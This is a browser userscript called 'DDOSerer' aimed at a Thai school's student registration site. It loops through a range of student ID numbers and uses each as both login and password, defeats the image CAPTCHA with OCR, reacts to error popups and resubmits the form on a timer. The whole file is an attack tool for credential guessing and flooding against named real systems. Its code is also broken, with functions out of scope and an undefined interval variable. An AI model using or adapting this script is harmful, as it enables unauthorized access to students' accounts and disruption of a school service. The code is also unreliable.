// ==UserScript==
// @name         DDOSerer
// @version      2.1
// @author       Peemai545
// @description  6 ma programmer, now faster lol
// @namespace    http://tampermonkey.net/
// @match        https://skr.webactivity.online/*/
// @match        https://skr.webactivity.online/*/register_main.php
// @icon         https://www.google.com/s2/favicons?sz=64&domain=webactivity.online
// @license      GNU General Public License v3.0
// @require      https://cdn.jsdelivr.net/npm/tesseract.js@2.1.4
// ==/UserScript==

(function () {
    'use strict';

    var registerlist = 'https://skr.webactivity.online/student/register_main.php';
    var logoutlist = 'https://skr.webactivity.online/student/register_logout.php';

    const MinStudentID = 51500;
    const MaxStudentID = 53000;

    const SpammerEnabled = true
    const SpammerInterval = 1500;

    // Experimental, do not touch!!!!! - Peemai
    // 'basic', 'advanced'
    const DebuggerEnabled = false
    const DetectorEnabled = true
    const QuquerEnabled = true
    const DebuggerMode = 'advanced' 
    const DetectorMode = 'advanced'
    const QuquerMode = 'advanced'

    function Logger(message){if (DebuggerEnabled) {console.log(message);}}

    function Checker(){if (window.location.href === registerlist) { Logger('On register main page, performing quick logout...');window.location.href = logoutlist;}}

    function Spammer(){
    // Function to populate input fields
    function Generator(placeholderText, value) {
        const inputField = document.querySelector(`input[placeholder="${placeholderText}"]`);
        if (inputField) {
            inputField.value = value;
            Logger(`Generated random value for '${placeholderText}' | value: ${value}`);
        } else {
            Logger(`Error: Input field '${placeholderText}' not found!`);
        }
    }

    // Function to generate random student ID
    function GenerateRandomStudentID() {
        return new Promise((resolve, reject) => {
            const worker = new Worker(URL.createObjectURL(new Blob([`
                self.onmessage = function(event) {
                    const { min, max } = event.data;
                    const randomValue = Math.floor(Math.random() * (max - min + 1)) + min;
                    self.postMessage(randomValue);
                };
            `], { type: 'application/javascript' })));

            worker.postMessage({ min: MinStudentID, max: MaxStudentID });
            worker.onmessage = function (event) {
                resolve(event.data);
            };
            worker.onerror = function (error) {
                reject(error);
            };
        });
    }

    // Function to populate input fields with generated student ID
    async function Inputter() {
        try {
            const studentID = await GenerateRandomStudentID();
            Generator('เลขประจำตัวนักเรียน 5 หลัก', studentID);
            Generator('รหัสผ่านที่โรงเรียนกำหนด', studentID);
        } catch (error) {
            Logger('Error generating random student ID and PIN:', error);
        }
    }

    // Function to decode CAPTCHA
    async function Decoder() {
        const captchaImage = document.querySelector('#imgCaptcha');
        if (!captchaImage) {
            Logger('Error: CAPTCHA image not found');
            return;
        }

        try {
            const { data: { text } } = await Tesseract.recognize(captchaImage.src, 'eng', {
                tessedit_char_whitelist: '0123456789',
                logger: m => Logger(m)
            });
            const captchaValue = text.replace(/\D/g, '');
            if (captchaValue) {
                Generator('พิมพ์ตัวเลขที่ปรากฏ', captchaValue);
                Logger(`Decoded CAPTCHA: ${captchaValue}`);
            } else {
                Logger('Error: Decoded CAPTCHA is empty. Retrying...');
                Decoder(); // Retry decoding
            }
        } catch (error) {
            Logger('Error decoding CAPTCHA:', error);
        }
    }

    // Function to automatically press the submit button
    function AutoSubmit() {
        const submitButton = document.getElementById('Submit');
        if (submitButton) {
            submitButton.click();
            Logger('Button "Submit" clicked automatically');
        }
    }
    }

    function Detector() {
        const observer = new MutationObserver((mutationsList) => {
            for (const mutation of mutationsList) {
                if (mutation.addedNodes.length) {
                    for (const node of mutation.addedNodes) {
                        if (node.nodeType === 1 && node.classList.contains('swal2-container') && node.classList.contains('swal2-center') && node.classList.contains('swal2-backdrop-show')) {
                            Logger("swal2-container detected.");
                            const errorTitle = node.querySelector('h2.swal2-title');
                            const errorMessage = node.querySelector('.swal2-html-container');
                            if (errorTitle) {
                                if (errorTitle.textContent.includes('ข้อผิดพลาด') && !errorTitle.textContent.includes('พบข้อผิดพลาด')) {
                                    Logger("Error popup detected. Refreshing ID and PIN...");
                                    Inputter();
                                } else if (errorTitle.textContent.includes('พบข้อผิดพลาด')) {
                                    Logger("Error popup detected. Refreshing CAPTCHA...");
                                    Decoder();
                                }
                            } else {
                                Logger("Error title not found.");
                            }
                            if (errorMessage) {
                                if (errorMessage.textContent.includes('กรุณาตรวจสอบ : ตัวเลขที่ป้อนไม่ถูกต้อง')) {
                                    Logger("CAPTCHA error detected. Refreshing CAPTCHA...");
                                    Decoder();
                                } else if (errorMessage.textContent.includes('กรุณาป้อนตัวเลขที่ปรากฎในภาพ')) {
                                    Logger("CAPTCHA prompt detected. Refreshing CAPTCHA...");
                                    Decoder();
                                } else {
                                    Logger(`Unrecognized error message: ${errorMessage.textContent}`);
                                }
                            } else {
                                Logger("Error message not found.");
                            }
                        }
                    }
                }
            }
        });
    
        observer.observe(document.body, { childList: true, subtree: true });
    }

    function Ququer() {
        Checker()
        if (SpammerEnabled) {setInterval(AutoSubmit, AutoSubmitInterval) }
    }

    window.addEventListener('load', () => {
        Logger("Page Loaded.");
        Ququer();
    });

})();